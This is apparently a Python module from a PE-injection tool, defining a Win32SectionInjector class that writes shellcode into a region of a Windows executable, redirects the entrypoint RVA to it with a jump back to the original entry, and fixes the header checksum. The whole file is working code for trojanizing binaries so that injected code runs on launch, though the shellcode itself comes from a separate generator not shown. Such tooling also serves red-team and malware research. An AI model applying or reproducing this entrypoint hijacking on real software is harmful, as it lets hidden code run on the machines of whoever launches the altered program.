from Utils.MultiByteHandler import  MultiByteHandler
from Utils.Win32BinaryOffsetsAndSizes import Win32BinaryOffsetsAndSizes
from Utils.Win32BinaryUtils import Win32BinaryUtils

class Win32SectionInjector:

    def __overwrite_entrypoint_rva(self, header_offset):

        # Get current RVA for entrypoint
        offset_for_address_of_entrypoint_rva_on_the_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA

        # Overwrite current RVA for entrypoint with the new one. Not sure if i should change BaseOfCode???
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_for_address_of_entrypoint_rva_on_the_header, self.injection_location_rva)

    #Probaly pass this to an Utility section
    def __inject_shell_code(self):

        memory_offset = self.injection_location_raw
        for shell_code_byte in self.shell_code:
            self.binary_data[memory_offset] = shell_code_byte
            memory_offset += 1

    def __update_checksum(self, header_offset):
        checksum_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CHECKSUM
        checksum = Win32BinaryUtils.compute_checksum(self.binary_data, header_offset)
        MultiByteHandler.set_dword_given_offset(self.binary_data, checksum_offset, checksum)

    def modify_binary(self):

        header_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, Win32BinaryOffsetsAndSizes.OFFSET_TO_PE_HEADER_OFFSET)
        # Get current RVA for entrypoint
        offset_for_address_of_entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA)

        #Get formated shellcode
        self.shell_code = self.shell_code_generator.get_base_shell_code(offset_for_address_of_entrypoint_rva - self.injection_location_rva)
        # Injecting shellcode
        self.__inject_shell_code()
        # Redirect execution to shellcode
        self.__overwrite_entrypoint_rva(header_offset)
        self.__update_checksum(header_offset)
        #Win32BinaryUtils.compute_checksum(self.binary_data, header_offset)

        return self.binary_data

    def __init__(self, binary_data, shell_code_generator, rva_for_region, raw_offset_for_region):

        self.binary_data = binary_data
        self.shell_code_generator = shell_code_generator
        self.shell_code = shell_code_generator.get_base_shell_code(0)
        self.injection_location_rva = rva_for_region
        self.injection_location_raw = raw_offset_for_region
        # extended section must have their RVAs adjusted. This variable contains the adjustment.
